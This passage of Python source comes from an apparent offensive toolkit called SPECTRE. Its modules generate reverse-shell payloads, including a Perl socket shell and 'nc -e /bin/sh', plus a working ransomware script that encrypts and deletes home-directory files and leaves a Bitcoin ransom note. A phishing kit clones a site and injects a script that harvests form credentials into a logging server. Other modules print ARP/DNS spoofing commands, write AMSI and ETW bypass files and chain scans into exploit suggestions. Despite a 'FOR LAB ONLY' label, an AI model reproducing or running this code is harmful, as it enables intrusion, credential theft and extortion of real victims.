if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
    exec("/bin/sh -i");
}}
''',
            "nc": f"nc -e /bin/sh {host} {port}\n",
        }
        ext_map = {"python":".py","php":".php","bash":".sh",
                   "powershell":".ps1","perl":".pl","nc":".txt"}
        ts = Utils.timestamp()
        out_dir = Path(f"backdoor_{ts}")
        out_dir.mkdir(exist_ok=True)
        for lang, code in payloads.items():
            path = out_dir / f"{lang}_shell{ext_map[lang]}"
            Writer.script(path, code)
            print(C.s(f"Saved: {path}"))
        print(Fore.MAGENTA + "\n  Listener:")
        print(f"    {Fore.CYAN}nc -lvnp {port}")
        self.result = {"target": f"{host}:{port}",
                       "output_dir": str(out_dir),
                       "payloads": list(payloads.keys())}
        self.save()
        print()
        return self.result


# ============================================================
# 18. RANSOMWARE
# ============================================================
class RansomwareModule(BaseModule):
    name = "ransomware"
    severity = "critical"

    def run(self):
        print(Fore.CYAN + "── 💰 RANSOMWARE GEN ──")
        print(C.w("⚠️ FOR LAB ONLY"))
        code = '''#!/usr/bin/env python3
# SPECTRE Ransomware Simulator - EDU ONLY
import os, base64
from cryptography.fernet import Fernet
key = Fernet.generate_key()
c = Fernet(key)
exts = ['.txt','.docx','.pdf','.jpg','.png','.mp4','.zip','.sql','.py','.csv']
for root,_,files in os.walk(os.path.expanduser("~")):
    for f in files:
        if any(f.endswith(e) for e in exts):
            p = os.path.join(root, f)
            try:
                with open(p, "rb") as fh: d = fh.read()
                with open(p + ".spectre", "wb") as fh: fh.write(c.encrypt(d))
                os.remove(p)
            except Exception: pass
with open("README_RANSOM.txt","w") as fh:
    fh.write("Files encrypted. Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
with open("decrypt_key.b64","w") as fh:
    fh.write(base64.b64encode(key).decode())
'''
        fn = f"ransomware_{Utils.timestamp()}.py"
        Writer.script(fn, code, executable=True)
        print(C.h(f"Saved: {fn}"))
        self.result = {"file": fn}
        self.save()
        print()
        return self.result


# ============================================================
# 19. PHISHING
# ============================================================
class PhishingModule(BaseModule):
    name = "phishing"
    severity = "high"

    HARVEST = r"""
<script>
document.querySelectorAll('form').forEach(function(form){
    form.addEventListener('submit', function(e){
        e.preventDefault();
        var data = new FormData(form);
        var payload = {};
        for (var pair of data.entries()) payload[pair[0]] = pair[1];
        fetch('/_harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({data: payload, url: location.href, ua: navigator.userAgent})
        }).finally(function(){
            setTimeout(function(){location.href='https://REAL_TARGET';}, 1500);
        });
    });
});
</script>
"""

    def run(self):
        print(Fore.CYAN + "── 🎣 PHISHING ──")
        url = self.url()
        print(C.i(f"Cloning: {url}"))
        try:
            r = self.session.get(url, timeout=15, allow_redirects=True)
            html = r.text
            from urllib.parse import urljoin, urlparse
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            if HAS_BS4:
                soup = BeautifulSoup(html, "html.parser")
                for tag in soup.find_all(["a","link","script","img","form"]):
                    for attr in ["href","src","action"]:
                        if tag.has_attr(attr):
                            v = tag[attr]
                            if v and not v.startswith(("http","//","data:","#","javascript:")):
                                tag[attr] = urljoin(base, v)
                    if tag.name == "form":
                        tag["action"] = "/_harvest"
                        tag["method"] = "POST"
                if soup.body:
                    inj = BeautifulSoup(self.HARVEST.replace("REAL_TARGET", url), "html.parser")
                    soup.body.append(inj)
                html = str(soup)
            else:
                html = html.replace("</body>", self.HARVEST + "</body>")
        except Exception as e:
            print(C.e(f"Clone: {e}"))
            self.result = {"error": str(e)}
            self.save()
            print()
            return self.result

        ts = Utils.timestamp()
        out_dir = Path(f"phishing_{ts}")
        out_dir.mkdir(exist_ok=True)
        (out_dir / "index.html").write_text(html, encoding="utf-8")

        server_code = '''#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/index.html"):
            with open("index.html", "rb") as f: c = f.read()
            self.send_response(200)
            self.send_header("Content-Type","text/html")
            self.send_header("Content-Length", str(len(c)))
            self.end_headers(); self.wfile.write(c)
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        if self.path == "/_harvest":
            n = int(self.headers.get("Content-Length",0))
            body = self.rfile.read(n).decode("utf-8", errors="ignore")
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = self.client_address[0]
            with open("harvest.log","a") as f:
                f.write(f"[{ts}] IP={ip} DATA={body}\\n")
            print(f"[+] {ip} | {body[:200]}")
            self.send_response(200); self.end_headers()
            self.wfile.write(b'{"ok":true}')
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, fmt, *args): pass

if __name__ == "__main__":
    print("Listening on :8080")
    HTTPServer(("0.0.0.0", 8080), H).serve_forever()
'''
        (out_dir / "server.py").write_text(server_code)
        try: os.chmod(out_dir / "server.py", 0o755)
        except Exception: pass

        print(C.h(f"Kit: {out_dir}/"))
        print(C.i(f"Run: cd {out_dir} && python3 server.py"))
        self.result = {"output_dir": str(out_dir), "source": url, "size": len(html)}
        self.save()
        print()
        return self.result


# ============================================================
# 20. CRYPTO
# ============================================================
class CryptoModule(BaseModule):
    name = "crypto"

    def _btc(self, wallet):
        try:
            r = self.session.get(f"https://blockchain.info/rawaddr/{wallet}?limit=10",
                                  timeout=15)
            if r.status_code != 200:
                return {"error": f"HTTP {r.status_code}"}
            j = r.json()
            return {"chain": "BTC", "wallet": wallet,
                    "final_balance_btc": j.get("final_balance",0)/1e8,
                    "total_received_btc": j.get("total_received",0)/1e8,
                    "n_tx": j.get("n_tx",0),
                    "txs": [{"hash": t.get("hash"),
                             "time": t.get("time"),
                             "result_btc": t.get("result",0)/1e8}
                            for t in j.get("txs", [])[:10]]}
        except Exception as e:
            return {"error": str(e)}

    def _eth(self, wallet):
        try:
            r = self.session.get("https://api.etherscan.io/api",
                                  params={"module":"account","action":"balance",
                                          "address":wallet,"tag":"latest"}, timeout=15)
            balance_wei = int(r.json().get("result", 0))
            balance_eth = balance_wei / 1e18
            r2 = self.session.get("https://api.etherscan.io/api",
                                   params={"module":"account","action":"txlist",
                                           "address":wallet,"page":1,"offset":10,
                                           "sort":"desc"}, timeout=15)
            txs = r2.json().get("result", [])
            if not isinstance(txs, list): txs = []
            return {"chain": "ETH", "wallet": wallet,
                    "balance_eth": balance_eth, "n_tx": len(txs),
                    "txs": [{"hash": t.get("hash"), "value_eth": int(t.get("value",0))/1e18,
                             "time": t.get("timeStamp")} for t in txs[:10]]}
        except Exception as e:
            return {"error": str(e)}

    def run(self):
        print(Fore.CYAN + "── 🪙 CRYPTO ──")
        wallet = self.target.strip()
        if re.match(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$", wallet):
            chain = "BTC"
        elif re.match(r"^0x[a-fA-F0-9]{40}$", wallet):
            chain = "ETH"
        else:
            chain = "BTC"
            print(C.w("Unknown format, trying BTC"))
        print(C.i(f"Chain: {chain}"))
        data = self._btc(wallet) if chain == "BTC" else self._eth(wallet)
        if "error" in data:
            print(C.e(f"Failed: {data['error']}"))
        else:
            bal = data.get("final_balance_btc") or data.get("balance_eth")
            print(C.s(f"Balance: {bal} {chain}"))
            print(C.s(f"Txs: {data.get('n_tx')}"))
            for tx in data.get("txs", [])[:5]:
                h = tx.get("hash","")[:20]
                v = tx.get("result_btc") or tx.get("value_eth",0)
                print(f"    💸 {h}... {v:+.6f} {chain}")
        self.result = data
        self.save()
        print()
        return self.result


# ============================================================
# 21. WIFI
# ============================================================
class WiFiModule(BaseModule):
    name = "wifi"

    def run(self):
        print(Fore.CYAN + "── 📶 WIFI ──")
        networks = []
        osname = platform.system().lower()
        if osname == "linux":
            try:
                out = subprocess.check_output(
                    ["nmcli","-t","-f","SSID,SIGNAL,SECURITY","device","wifi","list"],
                    encoding="utf-8", stderr=subprocess.DEVNULL, timeout=15)
                for line in out.strip().split("\n"):
                    parts = line.split(":")
                    if len(parts) >= 3:
                        networks.append({"ssid": parts[0], "signal": parts[1],
                                          "security": parts[2]})
            except Exception:
                pass
            if not networks:
                try:
                    out = subprocess.check_output(["iwlist","scan"], encoding="utf-8",
                                                   stderr=subprocess.DEVNULL, timeout=15)
                    cur = {}
                    for line in out.split("\n"):
                        if "ESSID:" in line:
                            cur["ssid"] = line.split("ESSID:")[1].strip().strip('"')
                        elif "Signal level=" in line:
                            cur["signal"] = line.split("Signal level=")[1].split()[0]
                        if "ssid" in cur and "signal" in cur:
                            networks.append(cur); cur = {}
                except Exception:
                    pass
        elif osname == "windows":
            try:
                out = subprocess.check_output(
                    ["netsh","wlan","show","networks","mode=bssid"],
                    encoding="utf-8", stderr=subprocess.DEVNULL, timeout=15)
                cur = {}
                for line in out.split("\n"):
                    line = line.strip()
                    if line.startswith("SSID") and ":" in line:
                        if cur.get("ssid"): networks.append(cur)
                        cur = {"ssid": line.split(":",1)[1].strip()}
                    elif "Signal" in line:
                        cur["signal"] = line.split(":",1)[1].strip()
                if cur.get("ssid"): networks.append(cur)
            except Exception:
                pass
        if not networks:
            print(C.w("No networks (permission?)"))
        else:
            for n in networks[:20]:
                print(C.s(f"{n.get('ssid','?')} | signal={n.get('signal','?')}"))
        self.result = {"networks": networks, "count": len(networks), "os": osname}
        self.save()
        print()
        return self.result


# ============================================================
# 22. DNS SPOOF
# ============================================================
class DNSSpoofModule(BaseModule):
    name = "dns_spoof"

    def run(self):
        print(Fore.CYAN + "── 🌐 DNS SPOOF ──")
        target = self.target
        spoof_ip = f"192.168.1.{random.randint(2,254)}"
        iface = "eth0" if platform.system().lower() == "linux" else "wlan0"
        print(C.h(f"Target: {target}"))
        print(C.h(f"Spoof IP: {spoof_ip}"))
        tools = {}
        for t in ["ettercap", "dnschef", "arpspoof", "bettercap"]:
            tools[t] = bool(Utils.which(t))
            print(f"  {'✅' if tools[t] else '❌'} {t}")
        cmds = {
            "ettercap": f"sudo ettercap -T -q -i {iface} -M arp:remote /gateway/ /{target}/",
            "dnschef": f"sudo dnschef --fakeip {spoof_ip} --fakedomains {target} --interface {iface}",
            "arpspoof": f"sudo arpspoof -i {iface} -t gateway {target}",
            "bettercap": f"sudo bettercap -iface {iface}",
        }
        print(Fore.MAGENTA + "\n  Commands:")
        for n, c in cmds.items():
            print(f"    [{n}] {c}")
        print(Fore.MAGENTA + "\n  Enable IP forward:")
        print(f"    sudo sysctl -w net.ipv4.ip_forward=1")
        self.result = {"target": target, "spoof_ip": spoof_ip,
                       "interface": iface, "tools": tools, "commands": cmds}
        self.save()
        print()
        return self.result


# ============================================================
# 23. YARA
# ============================================================
class YaraModule(BaseModule):
    name = "yara"

    RULES = r"""
rule Suspicious_PowerShell {
    strings:
        $a = "powershell" nocase
        $b = "-enc" nocase
        $c = "IEX" nocase
    condition: any of them
}
rule Reverse_Shell_Bash {
    strings:
        $a = "/dev/tcp/"
        $b = "bash -i"
    condition: any of them
}
rule Ransomware_Indicator {
    strings:
        $a = "cryptography.fernet" nocase
        $b = ".spectre"
        $c = "ransom" nocase
    condition: 2 of them
}
rule Keylogger_Indicator {
    strings:
        $a = "pynput" nocase
        $b = "keyboard.Listener" nocase
    condition: any of them
}
"""

    def _scan_file(self, path):
        try:
            import yara
            rules = yara.compile(source=self.RULES)
            return [{"rule": m.rule, "tags": list(m.tags), "meta": m.meta}
                    for m in rules.match(path)]
        except ImportError:
            return [{"error": "yara-python not installed"}]
        except Exception as e:
            return [{"error": str(e)}]

    def run(self):
        print(Fore.CYAN + "── 🧬 YARA ──")
        path = self.target
        if os.path.isdir(path):
            results = {}
            for root, _, files in os.walk(path):
                for f in files:
                    p = os.path.join(root, f)
                    m = self._scan_file(p)
                    if m and not any("error" in x for x in m):
                        results[p] = m
                        for x in m:
                            print(C.h(f"{p}: {x['rule']}"))
                            self.add_finding(f"YARA: {x['rule']}", p, "high")
            self.result = {"path": path, "matches": results}
        elif os.path.isfile(path):
            m = self._scan_file(path)
            if m and not any("error" in x for x in m):
                for x in m:
                    print(C.h(f"MATCH: {x['rule']}"))
                    self.add_finding(f"YARA: {x['rule']}", path, "high")
                self.result = {"path": path, "matches": m}
            elif m:
                print(C.e(m[0]["error"]))
                self.result = {"error": m[0]["error"]}
            else:
                print(C.s("Clean"))
                self.result = {"matches": []}
        else:
            print(C.e("Not found"))
            self.result = {"error": "not found"}
        self.save()
        print()
        return self.result


# ============================================================
# 24. MSF
# ============================================================
class MSFModule(BaseModule):
    name = "msf"

    def run(self):
        print(Fore.CYAN + "── 💥 MSF ──")
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            print(C.e("pymetasploit3 not installed"))
            self.result = {"error": "missing"}
            self.save()
            print()
            return self.result
        host = cfg.get("exploit.msf.host", "127.0.0.1")
        port = cfg.get("exploit.msf.port", 55552)
        password = cfg.get("exploit.msf.password", "msf")
        try:
            client = MsfRpcClient(password, server=host, port=port, ssl=False)
            print(C.s("Connected to MSF"))
            exploits = client.modules.exploits
            keyword = self.target if self.target != "localhost" else ""
            filtered = [e for e in exploits if keyword.lower() in e.lower()][:50]
            self.result = {"total": len(exploits), "keyword": keyword,
                           "matches": filtered}
            print(C.i(f"Total: {len(exploits)} | Matches: {len(filtered)}"))
            for e in filtered[:20]:
                print(f"    {e}")
        except Exception as e:
            print(C.e(f"MSF: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 25. EVASION
# ============================================================
class EvasionModule(BaseModule):
    name = "evasion"

    def run(self):
        print(Fore.CYAN + "── 🥷 EVASION ──")
        try:
            from plugin_loader import Evasion
        except ImportError:
            print(C.e("plugin_loader missing"))
            self.result = {"error": "missing"}
            self.save()
            print()
            return self.result
        ip = self.target if Utils.is_ip(self.target) else "10.0.0.5"
        port = random.randint(4444, 9999)
        shells = Evasion.reverse_shell_variants(ip, port)
        obf = Evasion.obfuscate_python("print('spectre')")
        amsi = Evasion.amsi_bypass_ps()
        etw = Evasion.etw_patch_ps()
        msf = Evasion.msfvenom_cheatsheet(ip, port)
        ts = Utils.timestamp()
        out_dir = Path(f"evasion_{ts}")
        out_dir.mkdir(exist_ok=True)
        (out_dir / "reverse_shells.txt").write_text(
            "\n\n".join(f"# {k}\n{v}" for k, v in shells.items()))
        (out_dir / "obfuscated.py").write_text(obf)
        (out_dir / "amsi_bypass.ps1").write_text(amsi)
        (out_dir / "etw_patch.ps1").write_text(etw)
        (out_dir / "msfvenom.txt").write_text("\n".join(msf))
        print(C.s(f"Shells: {len(shells)}"))
        print(C.s(f"MSFVenom: {len(msf)}"))
        print(C.h(f"Output: {out_dir}/"))
        self.result = {"output_dir": str(out_dir), "shells": list(shells.keys()),
                       "count_shells": len(shells)}
        self.save()
        print()
        return self.result


# ============================================================
# 26. AUTOPWN
# ============================================================
class AutoPwnModule(BaseModule):
    name = "auto_pwn"
    severity = "critical"

    def run(self):
        print(Fore.CYAN + "── 🤖 AUTOPWN ──")
        chain_log = []
        session = SessionFactory.create()

        print(C.i("[1/4] Portscan"))
        pm = PortModule(self.target, session); pm.run()
        chain_log.append(("portscan", pm.result))
        ports = [p["port"] for p in pm.result.get("open_ports", [])]

        print(C.i("[2/4] Tech"))
        tm = TechModule(self.target, session); tm.run()
        chain_log.append(("tech", tm.result))

        print(C.i("[3/4] SQLi"))
        sm = SQLiModule(self.url(), session); sm.run()
        chain_log.append(("sqli", sm.result))

        print(C.i("[4/4] Suggest"))
        suggestions = []
        server = tm.result.get("server", {}).get("raw", "") if isinstance(tm.result, dict) else ""
        if "2.4.49" in server:
            suggestions.append({"cve": "CVE-2021-41773",
                                 "exploit": "apache_normalize_path"})
        if sm.result.get("findings"):
            suggestions.append({"type": "SQLi",
                                 "tool": "sqlmap -u <url> --batch --dbs"})
        if 445 in ports:
            suggestions.append({"exploit": "ms17_010_eternalblue"})
        if 3306 in ports:
            suggestions.append({"tool": "hydra mysql://"})
        if 22 in ports:
            suggestions.append({"tool": "hydra ssh://"})

        if suggestions:
            print(C.h(f"Suggestions: {len(suggestions)}"))
            for s in suggestions: print(f"    {s}")
        else:
            print(C.s("No suggestion"))
        self.result = {"chain": [c[0] for c in chain_log],
                       "suggestions": suggestions, "ports": ports}
        self.save()
        print()
        return self.result


# ============================================================
# REGISTRY
# ============================================================
RECON_MODULES = {
    "geoip": GeoIPModule, "breach": BreachModule, "darkweb": DarkWebModule,
    "phone": PhoneModule, "portscan": PortModule, "whois": WhoisModule,
    "dns": DNSModule, "subdomain": SubdomainModule, "email": EmailModule,
    "ssl": SSLModule, "social": SocialModule, "tech": TechModule,
    "dir": DirModule, "async_recon": AsyncReconModule, "shodan": ShodanModule,
}

ATTACK_MODULES = {
    "sqli": SQLiModule, "backdoor": BackdoorModule, "ransomware": RansomwareModule,
    "phishing": PhishingModule, "crypto": CryptoModule, "wifi": WiFiModule,
    "dns_spoof": DNSSpoofModule,
}

EXPLOIT_MODULES = {
    "yara": YaraModule, "msf": MSFModule, "evasion": EvasionModule,
    "auto_pwn": AutoPwnModule,
}

ALL_MODULES = {**RECON_MODULES, **ATTACK_MODULES, **EXPLOIT_MODULES}


# ============================================================
# SELF-TEST
# ============================================================
if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    print(C.a(f"Modules self-test on: {target}"))
    print(C.i(f"Total: {len(ALL_MODULES)} modul"))
    print(C.i(f"List: {list(ALL_MODULES.keys())}"))
    print()
    print(C.a("Testing GeoIP..."))
    GeoIPModule(target).run()
    print(C.a("Testing Tech..."))
    TechModule(target).run()
    print(C.h("Modules done 💀"))